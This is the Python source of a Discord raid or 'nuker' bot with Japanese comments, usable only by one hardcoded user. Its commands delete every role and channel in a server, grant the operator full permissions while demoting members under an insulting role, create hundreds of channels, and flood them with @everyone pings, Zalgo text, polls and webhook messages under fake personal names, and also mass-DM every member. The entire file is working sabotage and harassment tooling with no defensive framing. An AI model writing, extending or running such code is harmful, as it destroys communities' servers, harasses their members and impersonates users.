import discord
from discord.ext import commands
from discord import app_commands
import random
import os
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

ALLOWED_USER_ID = 1464850594790637569

ZALGO_MARKS = [
    '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
    '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
    '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
    '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
    '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
    '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
    '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
    '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
]

def make_zalgo():
    base_text = "w" * 50 + "\n" + "a" * 100
    return ''.join(c + ''.join(random.choice(ZALGO_MARKS) for _ in range(15)) for c in base_text)

async def get_channel(interaction):
    channel = interaction.channel
    if channel is None:
        channel_id = interaction.channel_id
        if channel_id:
            channel = await bot.fetch_channel(channel_id)
    return channel

# =============================================
# イベント
# =============================================
@bot.event
async def on_ready():
    print(f'{bot.user} としてログインしました！')
    print(f'ボットID: {bot.user.id}')
    print('------')
    try:
        synced = await bot.tree.sync()
        print(f"✅ {len(synced)}個のスラッシュコマンドを同期しました")
    except Exception as e:
        print(f"スラッシュコマンド同期エラー: {e}")

# =============================================
# !lol コマンド
# =============================================
@bot.command()
async def lol(ctx, count: int = 100, *, message: str = None):
    if ctx.author.id != ALLOWED_USER_ID:
        return
    if count > 500:
        count = 500
    guild = ctx.guild
    try:
        role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
        await asyncio.gather(*role_delete_tasks, return_exceptions=True)
        yaju_role = await guild.create_role(name="野獣", permissions=discord.Permissions.all(), color=discord.Color.red())
        unko_permissions = discord.Permissions.none()
        unko_permissions.view_channel = True
        unko_permissions.read_message_history = True
        unko_role = await guild.create_role(name="うんこ", permissions=unko_permissions, color=discord.Color.from_rgb(139, 69, 19))
        bot_dead_role = await guild.create_role(name="死亡", permissions=discord.Permissions.none(), color=discord.Color.from_rgb(0, 0, 0))
        role_assign_tasks = []
        for member in guild.members:
            if member.id == bot.user.id:
                continue
            elif member.bot:
                role_assign_tasks.append(member.add_roles(bot_dead_role))
            elif member.id == ALLOWED_USER_ID:
                role_assign_tasks.append(member.add_roles(yaju_role))
            else:
                role_assign_tasks.append(member.add_roles(unko_role))
        await asyncio.gather(*role_assign_tasks, return_exceptions=True)
        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        create_tasks = [guild.create_text_channel(f"lol-{random.randint(1000,9999)}") for _ in range(count)]
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
        spam_message = f"@everyone {message}" if message else "@everyone"
        spam_tasks = [channel.send(spam_message) for channel in channels for _ in range(10)]
        await asyncio.gather(*spam_tasks, return_exceptions=True)
    except Exception as e:
        print(f"エラー: {e}")

# =============================================
# /lol スラッシュコマンド
# =============================================
@bot.tree.command(name="lol", description="メッセージ連投・投票爆撃")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
async def slash_lol(interaction: discord.Interaction, message: str = None, count: int = 50, use_webhook: bool = False):
    await interaction.response.defer(ephemeral=True)
    try:
        guild = interaction.guild
        if guild is None or guild.me is None:
            channel = await get_channel(interaction)
            if channel is None:
                await interaction.followup.send("❌ チャンネルが取得できませんでした", ephemeral=True)
                return
            spam_text = f"@everyone {message}" if message else f"@everyone {make_zalgo()}"
            spam_tasks = [channel.send(spam_text) for _ in range(count)]
            results = await asyncio.gather(*spam_tasks, return_exceptions=True)
            await interaction.followup.send(f"✅ {sum(1 for r in results if not isinstance(r, Exception))}回送信しました", ephemeral=True)
            return
        target_channels = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    perms = channel.permissions_for(guild.me)
                    if perms.send_messages:
                        target_channels.append(channel)
                        for thread in channel.threads:
                            if thread.permissions_for(guild.me).send_messages:
                                target_channels.append(thread)
                except:
                    pass
        try:
            async for thread in guild.archived_threads(limit=100):
                if thread.permissions_for(guild.me).send_messages and not thread.locked:
                    target_channels.append(thread)
        except:
            pass
        if not target_channels:
            await interaction.followup.send("❌ 送信可能なチャンネルが見つかりません", ephemeral=True)
            return
        fake_names = ["田中太郎", "佐藤花子", "鈴木一郎", "高橋美咲", "伊藤健太", "渡辺さくら", "山本大輔", "中村愛", "小林誠", "加藤優子"]
        if use_webhook:
            spam_text = f"@everyone {message}" if message else f"@everyone {make_zalgo()}"
            random_words = ["Discord", "Server", "Bot", "Admin", "Moderator", "User", "Member", "System", "Official", "Verified"]
            spam_tasks = []
            webhook_cache = {}
            for channel in target_channels:
                try:
                    if channel.id not in webhook_cache and isinstance(channel, discord.TextChannel):
                        base_name = random.choice(random_words)
                        zalgo_name = ''.join(c + ''.join(random.choice(ZALGO_MARKS) for _ in range(10)) for c in base_name)
                        webhook_cache[channel.id] = await channel.create_webhook(name=zalgo_name[:80])
                    if channel.id in webhook_cache:
                        for i in range(count):
                            spam_tasks.append(webhook_cache[channel.id].send(content=spam_text, username=fake_names[i % len(fake_names)], wait=False))
                except:
                    pass
            results = await asyncio.gather(*spam_tasks, return_exceptions=True)
            for wh in webhook_cache.values():
                try:
                    await wh.delete()
                except:
                    pass
            await interaction.followup.send(f"✅ Webhook偽装で{sum(1 for r in results if not isinstance(r, Exception))}回送信しました", ephemeral=True)
            return
        can_create_poll = False
        try:
            test_poll = await target_channels[0].send(poll=discord.Poll(question="test", duration=1))
            await test_poll.delete()
            can_create_poll = True
        except:
            pass
        if can_create_poll:
            poll_tasks = []
            for channel in target_channels:
                for i in range(count):
                    poll = discord.Poll(question=f"投票 #{i+1}", duration=24)
                    poll.add_answer(text="はい")
                    poll.add_answer(text="いいえ")
                    poll_tasks.append(channel.send(poll=poll))
            results = await asyncio.gather(*poll_tasks, return_exceptions=True)
            await interaction.followup.send(f"✅ {sum(1 for r in results if not isinstance(r, Exception))}個の投票を作成しました", ephemeral=True)
        else:
            spam_text = f"@everyone {message}" if message else f"@everyone {make_zalgo()}"
            spam_tasks = [channel.send(spam_text) for channel in target_channels for _ in range(count)]
            results = await asyncio.gather(*spam_tasks, return_exceptions=True)
            await interaction.followup.send(f"✅ {sum(1 for r in results if not isinstance(r, Exception))}回送信しました", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ エラー: {str(e)}", ephemeral=True)
        print(f"lolコマンドエラー: {e}")

# =============================================
# /spam コマンド（ボタン式）
# =============================================
class SpamButton(discord.ui.View):
    def __init__(self, spam_text, count):
        super().__init__(timeout=60)
        self.spam_text = spam_text
        self.count = count

    @discord.ui.button(label="実行", style=discord.ButtonStyle.danger)
    async def execute(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)

        channel = interaction.channel
        if channel is None:
            channel = bot.get_channel(interaction.channel_id)
        if channel is None:
            channel = await bot.fetch_channel(interaction.channel_id)

        # 1件目を送信してチャンネルを確定
        first_msg = await channel.send(self.spam_text)
        # 1件目のメッセージのチャンネルを使って残りを送信
        channel = first_msg.channel

        remaining = self.count - 1
        while remaining > 0:
            batch = min(5, remaining)
            tasks = [channel.send(self.spam_text) for _ in range(batch)]
            await asyncio.gather(*tasks, return_exceptions=True)
            remaining -= batch
            await asyncio.sleep(0.5)

@bot.tree.command(name="spam", description="このチャンネルだけにメッセージを連投")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
async def slash_spam(interaction: discord.Interaction, message: str = None, count: int = 50, everyone: bool = False):
    prefix = "@everyone " if everyone else ""
    spam_text = f"{prefix}{message}" if message else f"{prefix}{make_zalgo()}"
    view = SpamButton(spam_text, count)
    await interaction.response.send_message("▶ 実行ボタンを押してください", view=view, ephemeral=True)

# =============================================
# /qop コマンド（ボタン式）
# =============================================
class QopButton(discord.ui.View):
    def __init__(self, channel, count):
        super().__init__(timeout=60)
        self.channel = channel
        self.count = count

    @discord.ui.button(label="実行", style=discord.ButtonStyle.danger)
    async def execute(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)

        async def send_poll():
            poll = discord.Poll(question="このサーバーはうんこですか？", duration=24)
            for _ in range(15):
                poll.add_answer(text="はい")
            return await self.channel.send(poll=poll)

        # 5件ずつ送って少し待つ
        remaining = self.count
        while remaining > 0:
            batch = min(5, remaining)
            tasks = [send_poll() for _ in range(batch)]
            await asyncio.gather(*tasks, return_exceptions=True)
            remaining -= batch
            await asyncio.sleep(0.5)

@bot.tree.command(name="qop", description="このサーバーはうんこですか？投票を連投")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
async def slash_qop(interaction: discord.Interaction, count: int = 50):
    channel = await get_channel(interaction)
    if channel is None:
        await interaction.response.send_message("❌ チャンネルが取得できませんでした", ephemeral=True)
        return
    view = QopButton(channel, count)
    await interaction.response.send_message("▶ 実行ボタンを押してください", view=view, ephemeral=True)

# =============================================
# /dm コマンド
# =============================================
@bot.tree.command(name="dm", description="サーバー全員にDM爆撃（ボットがサーバーに参加している場合のみ）")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
async def slash_dm(interaction: discord.Interaction, message: str = "こんにちは", count: int = 10):
    await interaction.response.defer(ephemeral=True)
    try:
        guild = interaction.guild
        if guild is None or guild.me is None:
            await interaction.followup.send("❌ このコマンドはボットがサーバーに参加している場合のみ使えます", ephemeral=True)
            return
        members = [m for m in guild.members if not m.bot]
        if not members:
            await interaction.followup.send("❌ 送信可能なメンバーがいません", ephemeral=True)
            return
        dm_tasks = [member.send(message) for member in members for _ in range(count)]
        results = await asyncio.gather(*dm_tasks, return_exceptions=True)
        success_count = sum(1 for r in results if not isinstance(r, Exception))
        await interaction.followup.send(f"✅ {len(members)}人に{success_count}通送信しました（失敗: {len(results)-success_count}通）", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ エラー: {str(e)}", ephemeral=True)

# =============================================
# !clean コマンド
# =============================================
@bot.command()
async def clean(ctx):
    if ctx.author.id != ALLOWED_USER_ID:
        return
    guild = ctx.guild
    try:
        role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
        await asyncio.gather(*role_delete_tasks, return_exceptions=True)
        yaju_role = await guild.create_role(name="野獣", permissions=discord.Permissions.all(), color=discord.Color.red())
        unko_permissions = discord.Permissions.none()
        unko_permissions.view_channel = True
        unko_permissions.read_message_history = True
        unko_role = await guild.create_role(name="うんこ", permissions=unko_permissions, color=discord.Color.from_rgb(139, 69, 19))
        bot_dead_role = await guild.create_role(name="死亡", permissions=discord.Permissions.none(), color=discord.Color.from_rgb(0, 0, 0))
        role_assign_tasks = []
        for member in guild.members:
            if member.id == bot.user.id:
                continue
            elif member.bot:
                role_assign_tasks.append(member.add_roles(bot_dead_role))
            elif member.id == ALLOWED_USER_ID:
                role_assign_tasks.append(member.add_roles(yaju_role))
            else:
                role_assign_tasks.append(member.add_roles(unko_role))
        await asyncio.gather(*role_assign_tasks, return_exceptions=True)
        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        confirm_channel = await guild.create_text_channel("clean-完了")
        await confirm_channel.send("全てのチャンネルを消しました")
    except Exception as e:
        print(f"エラー: {e}")

# =============================================
# 起動
# =============================================
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer

class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Discord Bot is running!')
    def log_message(self, format, *args):
        return

def run_server():
    port = int(os.environ.get('PORT', 10000))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    print(f'HTTPサーバー起動: ポート {port}')
    server.serve_forever()

Thread(target=run_server, daemon=True).start()

TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
if not TOKEN:
    print("エラー: DISCORD_BOT_TOKEN 環境変数が設定されていません。")
    exit(1)

bot.run(TOKEN)
